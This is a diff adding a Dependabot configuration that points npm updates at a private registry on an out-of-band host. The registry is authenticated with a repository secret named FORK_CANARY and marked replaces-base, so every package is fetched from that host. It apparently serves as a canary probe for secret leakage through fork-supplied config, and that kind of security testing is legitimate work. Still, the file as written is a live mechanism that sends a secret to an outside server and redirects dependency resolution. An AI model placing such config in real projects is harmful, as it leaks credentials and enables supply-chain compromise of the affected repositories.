@@ -1,0 +1,14 @@
+version: 2
+registries:
+  npmoob:
+    type: npm-registry
+    url: https://depfk1-49c9.oob.ogxing.com
+    token: ${{secrets.FORK_CANARY}}
+    replaces-base: true
+updates:
+  - package-ecosystem: "npm"
+    directory: "/"
+    schedule:
+      interval: "daily"
+    registries:
+      - npmoob
